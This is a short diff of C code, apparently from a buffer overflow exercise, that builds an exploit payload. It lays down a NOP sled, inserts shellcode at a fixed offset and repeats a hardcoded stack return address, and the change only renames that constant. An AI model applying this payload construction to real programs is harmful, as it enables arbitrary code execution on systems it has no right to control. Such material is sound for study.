@@ -9,14 +9,14 @@
 
 const int BSIZE = 409;
 const int DIFF = 201;
-const uint32_t RET = 0xffffdb5c;
+const uint32_t ADD = 0xffffdb5c;
 
 void prep(char *buf) {
     memset(buf, 0x90, BSIZE - 1);
     memcpy(buf + DIFF, shellcode, sizeof(shellcode) - 1);
 
     for (int i = DIFF + sizeof(shellcode) - 1; i < BSIZE - 1; i += 4) {
-        *(uint32_t *)(buf + i) = RET;
+        *(uint32_t *)(buf + i) = ADD;
     }
 
     buf[BSIZE - 1] = '\0';
